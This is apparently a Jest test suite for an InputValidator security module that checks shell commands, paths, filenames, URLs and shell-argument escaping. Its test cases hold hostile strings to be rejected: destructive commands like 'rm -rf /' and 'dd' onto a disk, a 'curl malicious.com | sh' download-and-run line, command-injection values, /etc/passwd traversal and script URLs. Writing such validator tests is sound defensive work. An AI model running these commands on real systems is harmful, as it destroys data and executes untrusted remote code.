/**
 * Input Validator Tests
 * 
 * Comprehensive tests for input validation and security features.
 */

const InputValidator = require('../../security/InputValidator');

describe('InputValidator', () => {
  let validator;

  beforeEach(() => {
    validator = new InputValidator();
  });

  describe('validateInput', () => {
    test('should validate safe commands', () => {
      const result = validator.validateInput('ls -la');
      
      expect(result.isValid).toBe(true);
      expect(result.riskLevel).toBe('low');
      expect(result.errors).toHaveLength(0);
    });

    test('should reject dangerous commands', () => {
      const dangerousCommands = [
        'rm -rf /',
        'sudo rm -rf /',
        'format c:',
        'dd if=/dev/zero of=/dev/sda',
        'curl malicious.com | sh'
      ];

      dangerousCommands.forEach(cmd => {
        const result = validator.validateInput(cmd);
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('critical');
        expect(result.errors.length).toBeGreaterThan(0);
      });
    });

    test('should detect command injection attempts', () => {
      const injectionAttempts = [
        'ls; rm -rf /',
        'ls && malicious_command',
        'ls | sh',
        'ls `malicious`',
        'ls $(malicious)'
      ];

      injectionAttempts.forEach(cmd => {
        const result = validator.validateInput(cmd);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.includes('Dangerous pattern detected')
        )).toBe(true);
      });
    });

    test('should detect path traversal attempts', () => {
      const traversalAttempts = [
        'cat ../../../etc/passwd',
        'ls ..\\..\\windows\\system32',
        'cat %2e%2e%2fetc%2fpasswd'
      ];

      traversalAttempts.forEach(cmd => {
        const result = validator.validateInput(cmd);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.includes('Path traversal')
        )).toBe(true);
      });
    });

    test('should handle empty or invalid input', () => {
      const invalidInputs = [null, undefined, '', '   ', 123, {}];

      invalidInputs.forEach(input => {
        const result = validator.validateInput(input);
        expect(result.isValid).toBe(false);
      });
    });

    test('should enforce command length limits', () => {
      const longCommand = 'a'.repeat(1001);
      const result = validator.validateInput(longCommand);
      
      expect(result.isValid).toBe(false);
      expect(result.errors.some(error => 
        error.includes('Command too long')
      )).toBe(true);
    });

    test('should provide safer alternatives for dangerous commands', () => {
      const result = validator.validateInput('rm -rf /');
      
      expect(result.suggestions.length).toBeGreaterThan(0);
      expect(result.suggestions.some(suggestion => 
        suggestion.includes('trash')
      )).toBe(true);
    });
  });

  describe('sanitizePath', () => {
    test('should remove path traversal sequences', () => {
      const maliciousPath = '../../../etc/passwd';
      const sanitized = validator.sanitizePath(maliciousPath);
      
      expect(sanitized).not.toContain('../');
      expect(sanitized).toBe('etc/passwd');
    });

    test('should remove invalid filename characters', () => {
      const invalidPath = 'file<>:"|?*.txt';
      const sanitized = validator.sanitizePath(invalidPath);
      
      expect(sanitized).toBe('file.txt');
    });

    test('should handle null and undefined input', () => {
      expect(validator.sanitizePath(null)).toBe('');
      expect(validator.sanitizePath(undefined)).toBe('');
    });
  });

  describe('validateFileName', () => {
    test('should validate normal filenames', () => {
      const validNames = ['file.txt', 'document.pdf', 'script.js', 'image.png'];
      
      validNames.forEach(name => {
        const result = validator.validateFileName(name);
        expect(result.isValid).toBe(true);
        expect(result.errors).toHaveLength(0);
      });
    });

    test('should reject filenames with invalid characters', () => {
      const invalidNames = ['file<.txt', 'doc>.pdf', 'script|.js', 'file?.txt'];
      
      invalidNames.forEach(name => {
        const result = validator.validateFileName(name);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.includes('invalid characters')
        )).toBe(true);
      });
    });

    test('should reject reserved filenames', () => {
      const reservedNames = ['CON', 'PRN', 'AUX', 'NUL', 'COM1', 'LPT1'];
      
      reservedNames.forEach(name => {
        const result = validator.validateFileName(name);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.includes('reserved')
        )).toBe(true);
      });
    });

    test('should reject overly long filenames', () => {
      const longName = 'a'.repeat(256) + '.txt';
      const result = validator.validateFileName(longName);
      
      expect(result.isValid).toBe(false);
      expect(result.errors.some(error => 
        error.includes('too long')
      )).toBe(true);
    });
  });

  describe('validateUrl', () => {
    test('should validate HTTP and HTTPS URLs', () => {
      const validUrls = [
        'https://example.com',
        'http://example.com/path',
        'https://subdomain.example.com/path?query=value'
      ];
      
      validUrls.forEach(url => {
        const result = validator.validateUrl(url);
        expect(result.isValid).toBe(true);
        expect(result.errors).toHaveLength(0);
      });
    });

    test('should reject non-HTTP protocols', () => {
      const invalidUrls = [
        'ftp://example.com',
        'file:///etc/passwd',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>'
      ];
      
      invalidUrls.forEach(url => {
        const result = validator.validateUrl(url);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.includes('HTTP and HTTPS')
        )).toBe(true);
      });
    });

    test('should reject localhost and private IPs', () => {
      const privateUrls = [
        'http://localhost:3000',
        'http://127.0.0.1',
        'http://192.168.1.1',
        'http://10.0.0.1',
        'http://172.16.0.1'
      ];
      
      privateUrls.forEach(url => {
        const result = validator.validateUrl(url);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.includes('private networks')
        )).toBe(true);
      });
    });

    test('should reject malformed URLs', () => {
      const malformedUrls = [
        'not-a-url',
        'http://',
        'https://.',
        'http://[invalid'
      ];
      
      malformedUrls.forEach(url => {
        const result = validator.validateUrl(url);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.includes('Invalid URL')
        )).toBe(true);
      });
    });
  });

  describe('escapeShellArg', () => {
    test('should escape arguments with special characters', () => {
      const arg = 'file with spaces.txt';
      const escaped = validator.escapeShellArg(arg);
      
      expect(escaped).toBe("'file with spaces.txt'");
    });

    test('should handle arguments with single quotes', () => {
      const arg = "file's name.txt";
      const escaped = validator.escapeShellArg(arg);
      
      expect(escaped).toContain("'\"'\"'");
    });

    test('should not escape simple arguments', () => {
      const simpleArgs = ['file.txt', 'simple_name', '123', 'path/to/file'];
      
      simpleArgs.forEach(arg => {
        const escaped = validator.escapeShellArg(arg);
        expect(escaped).toBe(arg);
      });
    });

    test('should handle null and undefined input', () => {
      expect(validator.escapeShellArg(null)).toBe('');
      expect(validator.escapeShellArg(undefined)).toBe('');
    });
  });

  describe('findSimilarCommands', () => {
    test('should find similar commands for typos', () => {
      const typos = [
        { input: 'lst', expected: 'ls' },
        { input: 'catt', expected: 'cat' },
        { input: 'grp', expected: 'grep' }
      ];
      
      typos.forEach(({ input, expected }) => {
        const suggestions = validator.findSimilarCommands(input);
        expect(suggestions).toContain(expected);
      });
    });

    test('should limit number of suggestions', () => {
      const suggestions = validator.findSimilarCommands('x');
      expect(suggestions.length).toBeLessThanOrEqual(3);
    });

    test('should return empty array for very different commands', () => {
      const suggestions = validator.findSimilarCommands('verydifferentcommand');
      expect(suggestions).toHaveLength(0);
    });
  });

  describe('getStats', () => {
    test('should return validation statistics', () => {
      const stats = validator.getStats();
      
      expect(stats).toHaveValidStructure([
        'dangerousPatterns',
        'pathTraversalPatterns',
        'allowedCommands',
        'maxCommandLength',
        'maxPathLength'
      ]);
      
      expect(typeof stats.dangerousPatterns).toBe('number');
      expect(typeof stats.allowedCommands).toBe('number');
      expect(stats.dangerousPatterns).toBeGreaterThan(0);
      expect(stats.allowedCommands).toBeGreaterThan(0);
    });
  });
});